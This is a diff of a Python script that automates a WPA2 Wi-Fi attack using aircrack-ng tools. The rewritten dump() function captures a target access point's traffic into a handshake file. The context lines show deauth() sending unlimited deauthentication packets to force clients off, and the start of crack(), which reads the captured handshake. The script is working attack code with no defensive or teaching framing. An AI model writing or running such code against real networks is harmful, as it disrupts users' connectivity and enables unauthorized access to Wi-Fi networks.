@@ -1,18 +1,5 @@
 import subprocess, signal, sys, time, os, shutil, csv, glob
 
-def kill_airodump():
-    try:
-        # Killing all airodump-ng processes
-        subprocess.run(['sudo', 'pkill', '-f', 'airodump-ng'], check=True)
-        print("All airodump-ng processes have been terminated.")
-    except subprocess.CalledProcessError as e:
-        print("Failed to terminate airodump-ng processes:", e)
-
-def signal_handler(sig, frame):
-    print('\nCtrl+C detected, stopping...')
-    kill_airodump()
-    sys.exit(0)
-
 def deauth(ap_mac, c_mac, interface):
     try:
         subprocess.Popen(['sudo', 'aireplay-ng', '-0', '0', '-a', ap_mac, '-c', c_mac, interface],
@@ -23,9 +10,36 @@ def deauth(ap_mac, c_mac, interface):
 
 def dump(ap_mac, channel):
     try:
-        subprocess.run(['sudo', 'airodump-ng', 'wlan0mon', '--bssid', ap_mac, '-c', str(channel), '-w', '/mnt/data/wpa2_handshake'])
+        # Ensure the output directory exists
+        output_directory = "/mnt/data/wpa2_handshake"
+        os.makedirs(output_directory, exist_ok=True)
+        file_prefix = f"{output_directory}/airodump"
+
+        # Construct the command with the provided parameters
+        command = [
+            'airodump-ng',
+            '-c', channel,
+            '--bssid', ap_mac,
+            'wlan0mon',
+            '--write', file_prefix,
+            '--output-format', 'cap'
+        ]
+        print("Running airodump-ng... Press Ctrl+C to stop.")
+
+        # Execute the airodump-ng command
+        airodump_process = subprocess.Popen(command)
+        
+        try:
+            airodump_process.wait()
+        except KeyboardInterrupt:
+            airodump_process.terminate()
+            print("\nAirodump-ng stopped by user.")
+
     except Exception as e:
-        print(f"Failed to execute dump command: {e}")
+        print(f"An error occurred: {e}")
+    
+    finally:
+        print("Capture file saved.")
 
 def crack():
     cap_file = "/mnt/data/wpa2_handshake-01.cap"
